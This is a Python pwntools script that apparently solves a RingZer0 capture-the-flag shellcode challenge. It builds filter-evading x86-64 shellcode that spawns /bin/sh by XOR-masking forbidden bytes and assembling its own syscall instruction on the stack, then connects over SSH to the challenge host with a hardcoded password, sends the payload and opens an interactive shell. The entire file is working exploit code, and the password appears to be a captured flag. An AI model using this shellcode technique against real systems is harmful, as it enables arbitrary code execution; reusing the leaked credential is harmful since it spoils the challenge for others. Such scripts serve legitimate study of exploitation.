#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

def escape_encode(s):
    ret = ''
    for c in s:
        ret += '\\x%02x' % ord(c)
    return ret

def limit(s):
    if len(s) > 100:
        return False
    for c in s:
        if c == '\x00':
            return False
        if c == '\x0a':
            return False
        if c == '\x0d':
            return False
        if c == '\x2f':
            return False
        if c == '\xff':
            return False
        if c == '\x0f':
            return False
        if c == '\x05':
            return False
        if c == '\x68':
            return False
        if 0x40 <= ord(c) and ord(c) <= 0x65:
            return False
    return True

mask = 0x1f1f1f1f
shellcode =  asm('push 1')
shellcode += asm('mov ecx, 0x%08x' % mask)
shellcode += asm('mov dword ptr [rsp], 0x%08x' % (unpack('/bin', 32) ^ mask))
shellcode += asm('xor dword ptr [rsp], ecx')
shellcode += asm('mov esi, 0x%08x' % (unpack('/sh\x00', 32) ^ mask))
shellcode += asm('xor esi, ecx')
shellcode += asm('mov dword ptr[rsp + 4], esi')     # push "/bin/sh\x00"

shellcode += asm('push 1')
shellcode += asm('mov word ptr [rsp], 0x%04x' % (0x050f ^ 0x1f1f))
shellcode += asm('xor word ptr [rsp], cx')          # push syscall('\x0f\x05')

shellcode += asm('push 1')
shellcode += asm('mov dword ptr [rsp], 0x%08x' % (unpack(asm('mov rdi, rsp') + asm('nop'), 32) + 0x30))
shellcode += asm('xor dword ptr [rsp + 4], 0x%08x' % (unpack(asm('add rdi, 0x10'), 32) + 0x30))
shellcode += asm('sub dword ptr [rsp], 0x30')
shellcode += asm('sub dword ptr [rsp + 4], 0x30')   # push `mov rdi, rsp` + `nop` + `add rdi, 0x10`
                                                    #      (`\x48\x89\xe7\x90\x48\x83\xc7\x10`)

shellcode += asm('push 1')
shellcode += asm('xor word ptr [rsp + 4], 0x8001')
shellcode += asm('sub dword ptr [rsp+4], 2')
shellcode += asm('mov dword ptr [rsp], esp')
shellcode += asm('add dword ptr [rsp], 8')          # push rsp

shellcode += asm('xor esi, esi')                    # rsi = 0
shellcode += asm('xor edx, edx')                    # rdx = 0
shellcode += asm('xor eax, eax')
shellcode += asm('mov al, SYS_execve')              # rax = SYS_execve
shellcode += asm('ret')

if limit(shellcode) == False:
    print('limit failed!')
    exit(0)

conn = ssh(user = 'level5', 
           host = 'challenges.ringzer0team.com', 
           password = 'FLAG-quGaa0q6ragf5h1zrcU1Kt4UDK', 
           port = 10127)
shell = conn.shell()
shell.sendline(escape_encode(shellcode))
shell.interactive()     # you will get shell here
